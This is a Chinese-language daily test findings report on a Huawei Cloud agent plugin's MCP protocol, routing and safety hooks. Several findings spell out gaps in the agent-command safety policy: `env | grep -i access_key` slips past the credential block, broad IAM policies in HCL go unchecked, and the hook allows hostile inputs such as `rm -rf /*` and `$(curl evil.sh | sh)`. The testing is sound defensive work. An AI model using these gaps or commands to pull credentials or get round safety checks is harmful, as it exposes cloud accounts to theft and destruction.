# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro-0813）

> **落盘路径**：`results/Hermes/2026-10-17-1.94.193.150/Linux/FINDINGS.md`
> **生成时间**：`2026-10-17 05:25`（北京时间，每日定时全量测试）
> **被测版本**：`v1.1.9-next.0`（npm @next，gitHead `6302921c`）
> **版本差异说明**：本日被测版本仍为 **`v1.1.9-next.0`（`6302921c`）**（next=1.1.9-next.0 > latest=1.1.8，与昨日同版）。43 批探针对 `6302921c` 全量 fresh 重跑，**14 项产品缺陷（11 FAIL + 3 SPEC-MISMATCH）与昨日结论逐条一致**——同一缺陷集合本轮逐一复现，无新修复、无新回归。**昨日环境阻塞已解除**：VPC router 配额恢复（泄漏 VPC 已被清理，现存 2 个 VPC），真云四用例 D3-C1/D3-S2/D4-14/D4-13 由 BLOCKED 转 PASS（D3-C1 ECS 生命周期真机段完整执行并归零成功，验证上游 `realcloud_e2e.mjs` 清理修复生效；D4-13 writeDenied=true 干净、readPassRate=100%）。

---

## #1【P0】D4-2 凭证 env 打印拦截未覆盖 generic `access_key`

- **现象**：v1.1.9-next.0 复测——`env | grep HW_ACCESS_KEY` 已 `deny risk=credential`（HW_ 前缀已修复）；但 `env | grep -i access_key` 仍返回 `allow risk=not_huaweicloud`（应 `deny`）。对照 `env | grep HUAWEICLOUD_SDK_AK`、`env | grep HCLOUD_AK` 均正确 `deny`。
- **断言**：`env | grep -i access_key`（generic `access_key`/`secret_key` 关键字，无云厂商前缀）应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:515` env-dump 第二段正则 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 只匹配云厂商前缀，不匹配裸 `access_key`/`secret_key` 关键字。
- **影响**：可借 `env | grep access_key`（跨厂商通用凭证键名）提取 AK/SK 明文，凭证红线残留缺口。
- **证据**：`evidence/D4-2/stdout.txt`（classify-probe）

## #2【P0】D4-21 hook_check_artifacts 未拦截 HCL 形态 broad IAM 制品

- **现象**：v1.1.9-next.0 复测——`evaluateArtifacts` 对 HCL `resource "huaweicloud_iam_policy" ... statement { effect="Allow" actions = ["*"] resources=["*"] }` 返回 `decision=allow`、findings 空；`data "huaweicloud_iam_policy" "r" { name = "AdministratorFullAccess" }` 亦 `allow`；JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 正确 `deny`。
- **断言**：Terraform HCL `actions = ["*"]` 与 `AdministratorFullAccess` 托管策略引用的 broad IAM 制品应被拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:196`（规则 `hwc-iam-admin-policy`）regex 只覆盖 JSON 形态与 `Action = *`，未覆盖 HCL 小写复数 `actions = ["*"]`（带方括号列表）与 `AdministratorFullAccess` 托管策略后缀形态。
- **影响**：Terraform IaC broad IAM 绕过制品预检。
- **证据**：`evidence/D4-21/stdout.txt`（hook + hcl-probe）

## #3【P0】D9-12 initialize 握手协议安全基线两处缺口

- **现象**：v1.1.9-next.0 复测 D9-12 六项断言 4 通过/2 失败——① protocolVersion/capabilities/serverInfo ✓ ② tools/call 路由 ✓ ④ _decorateResult/_resetHintConsumption/_isHintConsumed ✓ ⑤ listSkillDirs/findSkillsRoot ✓；但 ③ initialize 分支不调用 `runVersionCheck`（改 `hdkitGenerateUserHash`，版本检查下沉 prewarm/check_cli）；⑥ 未 initialize 先 tools/list 未拒（返回工具列表，契约要求 -32600）。
- **断言**：③ initialize 阶段触发版本检查（runVersionCheck）；⑥ 未 initialize 先 tools/list 应返回 JSON-RPC -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:32-41` initialize 分支未调 `runVersionCheck`；`mcp-protocol.mjs:55-57` `dispatch()` 对 `tools/list` 无 initialize 前置状态机。
- **影响**：MCP 握手安全基线不完整——版本检查不在握手期执行；未初始化即可调用列表，协议时序约束缺失。
- **证据**：`evidence/D9-12/stdout.txt`（D9-12-probe）

## #4【P1】D4-6 hook_check_command 对 `--admin-pass` 命令不告警

- **现象**：v1.1.9-next.0 直调 `huaweicloud_hook_check_command` `command="hcloud ecs CreateServer --admin-pass \"SuperSecret123!\""` → 返回 `decision=allow`、`findings=[]`（应 warn/告警且不裸回显密码）。源码级 `redactSecrets` 对 `adminPass=xxx`/对象 key 已脱敏 PASS。
- **断言**：含 `--admin-pass`/`--admin_pass` 的写命令应触发 `hwc-command-adminpass-exposure` warn（`decision=warn` + findings），且不裸回显明文密码。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:68`（规则 `hwc-command-adminpass-exposure`）`stages = ["artifact","deploy_plan"]` 缺 `command` 阶段，故 hook_check_command（command 阶段）不触发该规则。
- **影响**：Agent 直接键入含明文 adminPass 的 ECS 建机命令无任何提示，密码回显告警失效。
- **证据**：`evidence/D4-6/stdout.txt`（supplement-probe MCP hook 层 + d4-6-probe 源码层）

## #5【P1】D4-17 hook 模糊输入 fail-open（默认放行）

- **现象**：v1.1.9-next.0 复测——`hook_check_command` 对空命令、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、含垃圾字节等输入均 `isError=false`、返回 `ok`（未拒绝、未崩溃）。
- **断言**：异常/无法解析的输入应默认 `deny`（fail-closed），而非 `allow`/`ok`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` —— `evaluate()` 汇总 `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无规则命中时默认 `allow`。
- **影响**：无法解析/规则未命中的命令与制品在预检阶段被放行（fail-open）。
- **证据**：`evidence/D4-17/stdout.txt`（supplement-probe）

## #6【P1】D4-25 Python hook 写操作遥测分类误判为 cli:invoke

- **现象**：v1.1.9-next.0 实测 `hooks/huaweicloud-safety.py` `record_cli_event`——只读 `hcloud ecs ListServersDetails` → `cli:read`（正确）；写 `hcloud vpc CreateVpc` → `cli:invoke`（应为 `cli:write`）；`hcloud help` → `cli:invoke`（正确）。
- **断言**：写操作 `hcloud <svc> <Create/Delete/Update...>` 应分类为 `cli:write`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE` 前置捕获组 `(^|[A-Za-z0-9])` 要求写操作前缀前是行首或字母数字，实际 `hcloud vpc CreateVpc` 中 `CreateVpc` 前是空格，永不匹配；应改用 `\b` 词边界。
- **影响**：Python hook 端写操作遥测被误分类，`hook-events.jsonl` 的 `cli:write` 事件缺失，遥测/审计失真（Node 端无此问题）。
- **证据**：`evidence/D4-25/stdout.txt`（new-safety-probe）

## #7【P1】D9-9 capabilities.cancellation 未声明（协议取消能力契约漂移）

- **现象**：v1.1.9-next.0 extended-probe 直调——initialize 返回 `capabilities = {"tools":{}}`，`capabilities.cancellation` **缺失**；取消通知后/重建后 `tools/list` 正常、initialize ok、无悬挂请求。
- **断言**：按用例 D9-9 口径「取消能力按 capabilities 实测（不存在 → SPEC-MISMATCH 标注而非假定）」——取消能力未声明即契约漂移。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:47-49`（initialize 响应 capabilities 构造处仅 `{tools:{}}`，未声明 `cancellation`）。
- **影响**：MCP 客户端无法获知取消能力 → 无法依赖 notifications/cancelled 语义，超时取消路径不可用。
- **证据**：`evidence/D9-9/stdout.txt`（extended-probe）

## #8【P1】D10-3 serviceCatalog 中文意图 `云主机` 未命中（92.9%，含展开级 EXP-E01）

- **现象**：v1.1.9-next.0 `eval/harness/run-eval.mjs` 对 15 条中文评测集 HIT=13 MISS=1 N/A=1（准确率 92.9%）。唯一 MISS：EXP-E01「帮我查一下我账号在华北北京四有哪些云主机」→ 预期 `ECS`，实际回退 `Run hcloud --help`；EXP-E08（诊断）为 N/A 由 `EXP-E08-probe` 覆盖（ALL PASS）。展开级 EXP-E01 同步判 FAIL（与 D10-3 同根因）。
- **断言**：`serviceCatalog` 中文意图「云主机」应命中 `ECS`（评测级准确率 100%）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1985-2000` `routeMap` 已补 `云服务器/弹性云服务器/服务器/虚拟机` 等 CJK 关键字（故 EXP-E02~E15 全部命中），但仍缺口语化别名 `云主机`（cloud host）→ 未命中回退。
- **影响**：中文口语化表达「云主机」在服务路由环节未命中（1/14 未命中，准确率 92.9%）。
- **证据**：`evidence/D10-3/stdout.txt`（routing + eval-harness）

## #9【P1】D3-S7 跨服务交付（Web 应用+RDS）复合意图部署目标未命中 + 最小实例创建前置缺失

- **现象**：v1.1.9-next.0 实测——复合意图「带 MySQL 的 Web 应用」路由 `services=["RDS"]`（RDS 命中=true，部署目标命中=false）；`RDS ListInstances` 只读 OK，「RDS CreateInstance」返回 `[USE_ERROR]Invalid parameter: db.port`（需 VPC/子网/安全组前置及 db.port/db.password 等参数）。
- **断言**：复合意图应命中 RDS + 部署目标（多 service 分层），最小 RDS 实例应可创建并归零。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1985` `routeMap` 无 Web 应用部署目标意图分解（仅关键词命中 RDS）；RDS 最小实例创建需 VPC/子网/安全组前置 + 完整参数（真·外部依赖，探针未预置）。
- **影响**：跨服务交付场景（Web+RDS）无法端到端闭环；部署目标缺失。
- **证据**：`evidence/D3-S7/stdout.txt`（new-fg-rds-probe）

## #10【P2】D4-26 findings.evidence 脱敏未覆盖 JSON 带引号 key（明文 secret_key/adminPass 泄漏）

- **现象**：v1.1.9-next.0 直调 `risk-rule-engine.evaluateArtifacts`——触发 `hwc-iam-admin-policy`（deny）的 JSON 制品含 `"secret_key":"SKSECRETVALUE9"`、`"adminPass":"MyP@ss12345"` 时，`findings[].evidence` 原样保留明文（仅 `access_key` 部分脱敏）。
- **断言**：findings.evidence 中 AK/SK/token/password 均被 `<redacted>` 替换，不泄露明文。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19` `redactEvidence` 捕获组要求键名 + 可空白 + `[:=]` 紧邻（如 `adminPass=xxx`），JSON 形态 `"adminPass":"xxx"` 键与 `:` 之间隔着 `"`，正则不匹配 → 明文残留。
- **影响**：制品/部署计划预检触发的 findings.evidence 在 JSON 形态下泄漏明文密码/AK/SK。
- **证据**：`evidence/D4-26/stdout.txt`（new-safety-probe）

## #11【P2】D3-S5 场景-复合意图分层路由未分解（存储+托管 无命中）

- **现象**：v1.1.9-next.0 实测——复合意图「物联网+时序+前端托管」`serviceCatalog` 返回 `skills=["Use huaweicloud-core to route intent."] services=["Run hcloud --help to list available services."]`（存储命中=false、托管/部署命中=false、多路命中=false）。
- **断言**：复合意图应拆分命中多个 service（存储类 + 托管/部署类），而非回退 `--help`。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1985` `routeMap` 为单意图关键词匹配，无复合意图多路分解逻辑。
- **影响**：复合意图场景分层推荐失效。
- **证据**：`evidence/D3-S5/stdout.txt`（new-scenario-probe）

## #12【P2】D3-S6 FunctionGraph 定时任务场景：CreateFunction 最小场景参数校验未通过（未生成 URN）

- **现象**：v1.1.9-next.0 实测——`serviceCatalog` 路由 FunctionGraph 命中（✓）；`plan CreateFunction` decision=allow；`run CreateFunction` 返回 `[USE_ERROR]Invalid parameter: function_name`（未生成 URN；报错参数在 function_name ↔ code.filename 间浮动，语义同为最小场景参数集不被稳定接受）；定时触发器无法绑定（无函数）；测后删除归零（未创建视为无残留）。
- **断言**：最小配置创建 FunctionGraph 函数应返回 URN 并绑定定时触发器，测后归零。
- **根因**：FunctionGraph `CreateFunction` 最小场景参数集未被 API 稳定接受——报错参数在 `function_name` ↔ `code.filename` 间浮动，函数未创建成功故 URN 缺失；触发器依赖函数存在故连带失败。
- **影响**：FunctionGraph 定时任务场景无法端到端闭环（路由已修复，创建前置仍缺）。
- **证据**：`evidence/D3-S6/stdout.txt`（new-fg-rds-probe）

## #13【P2】D8-9 安装 ID 遥测值 sanitizeValue 未脱敏 AK/SK/token（SPEC-MISMATCH）

- **现象**：v1.1.9-next.0 直调 `telemetry.sanitizeValue`——`sanitizeValue('AK=ABC123DEF456GHI')` 原样返回；`sanitizeValue('access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET')` 原样保留 AK/SK/token 明文。installId 生成/恢复稳定持久正常。
- **断言**：用例 D8-9 契约「sanitizeValue 移除 AK/SK/token 等敏感值与非法字符」——敏感值应替换为 `<redacted>`。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189` `sanitizeValue` 仅做 `replace(/[\r\n\t]+/g,' ')+trim+超长截断`，无 AK/SK/token/password 敏感值脱敏逻辑。
- **影响**：遥测事件值若携带命令参数/环境值中的 AK/SK/token，将以明文进入遥测上送，凭证泄漏风险。
- **证据**：`evidence/D8-9/stdout.txt`（new-config-probe）

## #14【P0】D10-4 安全规则库由 16 条增至 19 条（用例断言契约漂移，非安全回归）

- **现象**：v1.1.9-next.0 直调 safety policy——规则库 `version=0.1.0` `规则数=19` `severity={deny:9, warn:10}`；用例 D10-4 断言「规则库完整 16 条(9 deny + 7 warn)」不成立。四条行为断言（高危凭证文件→deny、只读 ListVpcs→allow、删除→warn/deny、明文 secret→deny）全部通过。
- **断言**：用例契约「16 条(9 deny + 7 warn)」与实际实现「19 条(9 deny + 10 warn)」不一致（漂移点，需维护者确认 19 条为预期并修订用例计数）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 新增 3 条 warn 规则，规则总数 16→19；用例断言计数未同步更新。
- **影响**：无安全回归，属测试契约滞后的 SPEC 漂移；行为断言全部通过。
- **证据**：`evidence/D10-4/stdout.txt`（new-safety-probe）

## #15【测试侧·已验证】D3-C1 ECS 生命周期真云 E2E 清理缺陷（上游已修复，本轮真机复测 PASS）

- **现象**：旧版 `realcloud_e2e.mjs` `DeleteServers` 缺 `--delete_volume=true` 致系统盘未随删、ECS 保持 ACTIVE，subnet/vpc 仅校验退出码未校验真删。上游测试脚本已修复（commit `ddcbaa865`「兜底删除 ECS，根治周期性真云泄漏」+ `8ed45f93f`「资源清理校验真实删除结果」）。
- **断言**：真云 E2E 测后应自动删除 ECS+系统盘并归零验证。
- **状态**：**已修复并真机复测通过**——本轮 VPC 配额恢复，D3-C1 真机段完整执行：CreateVpc/CreateSubnet/CreateServers 成功，finally 归零校验 ECS 轮询已归零 + subnet:OK + vpc:OK（无残留），标 PASS。
- **证据**：`evidence/D3-C1/stdout.txt`（realcloud_e2e.mjs --case=D3-C1，status=PASS passed=5 failed=0）

## #16【非产品缺陷·已解除】VPC router 配额耗尽环境阻塞（本轮已恢复，真云四用例转 PASS）

- **现象**：昨日 VPC router 配额 5/5 耗尽（泄漏 `testbot1-hermes-e2e-*` + `devkit-bench-*` VPC 占用），导致 D3-C1/D3-S2/D4-13/D4-14 四个真云用例 BLOCKED。本轮盘点 cn-north-4 现存 2 个 VPC（`tctest-diag2`、`testbot1-hermes-e2e-2099592118`），配额已释放。
- **状态**：**已解除**——本轮四个真云用例全部真机跑通：D3-C1（ECS 生命周期归零 PASS）、D3-S2（VPC 创建→plan deny→确认删除→归零 PASS）、D4-14（CreateVpc→CTS 审计→DeleteVpc→归零 PASS）、D4-13（只读 6/6 可用 + writeDenied=true + 归零 PASS）。
- **遗留**：仍有 `testbot1-hermes-e2e-2099592118`（VPC）与 `testbot1-hermes-ecs-2099592118`（ECS ACTIVE）历史泄漏未清理（非本轮创建，红线禁止误删），建议维护侧建立周期清理任务。
- **证据**：`evidence/D3-C1/stdout.txt`、`evidence/D3-S2/stdout.txt`、`evidence/D4-13/stdout.txt`、`evidence/realcloud-probe/stdout.txt`

---